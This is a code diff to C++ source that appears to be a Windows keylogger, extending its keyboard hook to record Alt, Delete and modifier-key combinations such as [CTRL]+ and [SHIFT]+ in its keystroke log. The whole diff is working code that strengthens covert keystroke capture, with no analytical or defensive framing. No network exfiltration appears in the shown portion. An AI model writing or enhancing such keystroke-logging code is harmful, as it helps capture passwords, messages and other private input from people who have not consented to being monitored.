@@ -73,6 +73,8 @@ const std::map<int, std::string> keyname{
 	{VK_LCONTROL,	"[LCONTROL]" },
 	{VK_RCONTROL,	"[RCONTROL]" },
 	{VK_MENU,	"[ALT]" },
+	{VK_LMENU,	"[LALT]" },
+	{VK_RMENU,	"[RALT]" },
 	{VK_LWIN,	"[LWIN]" },
 	{VK_RWIN,	"[RWIN]" },
 	{VK_ESCAPE,	"[ESCAPE]" },
@@ -84,6 +86,7 @@ const std::map<int, std::string> keyname{
 	{VK_DOWN,	"[DOWN]" },
 	{VK_PRIOR,	"[PG_UP]" },
 	{VK_NEXT,	"[PG_DOWN]" },
+	{VK_DELETE,	"[DELETE]" },
 	{VK_OEM_PERIOD,	"." },
 	{VK_DECIMAL,	"." },
 	{VK_OEM_PLUS,	"+" },
@@ -109,7 +112,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 	if (nCode >= 0)
 	{
 		// the action is valid: HC_ACTION.
-		if (wParam == WM_KEYDOWN)
+		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)  // Added WM_SYSKEYDOWN to catch ALT key
 		{
 			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
@@ -187,6 +190,36 @@ int Save(int key_stroke)
 #elif FORMAT == 16
 	output << std::hex << "[" << key_stroke << ']';
 #else
+	// Check if Ctrl is pressed
+	bool ctrlPressed = ((GetKeyState(VK_CONTROL) & 0x8000) != 0);
+	// Check if Shift is pressed
+	bool shiftPressed = ((GetKeyState(VK_SHIFT) & 0x8000) != 0);
+	// Check if Alt is pressed - check both Alt and specific left/right Alt keys
+	bool altPressed = ((GetKeyState(VK_MENU) & 0x8000) != 0) ||
+                      ((GetKeyState(VK_LMENU) & 0x8000) != 0) ||
+                      ((GetKeyState(VK_RMENU) & 0x8000) != 0);
+
+	// Skip logging for modifier keys when pressed alone
+	if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL ||
+		key_stroke == VK_RCONTROL || key_stroke == VK_SHIFT ||
+		key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT ||
+		key_stroke == VK_MENU || key_stroke == VK_LMENU || key_stroke == VK_RMENU)
+	{
+		// Don't log modifier keys by themselves
+		return 0;
+	}
+
+	// Add modifier prefixes if pressed
+	if (ctrlPressed) {
+		output << "[CTRL]+";
+	}
+	if (shiftPressed) {
+		output << "[SHIFT]+";
+	}
+	if (altPressed) {
+		output << "[ALT]+";
+	}
+
 	if (keyname.find(key_stroke) != keyname.end())
 	{
 		output << keyname.at(key_stroke);
@@ -198,8 +231,7 @@ int Save(int key_stroke)
 		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
 		// check shift key
-		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
-			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
+		if (shiftPressed)
 		{
 			lowercase = !lowercase;
 		}
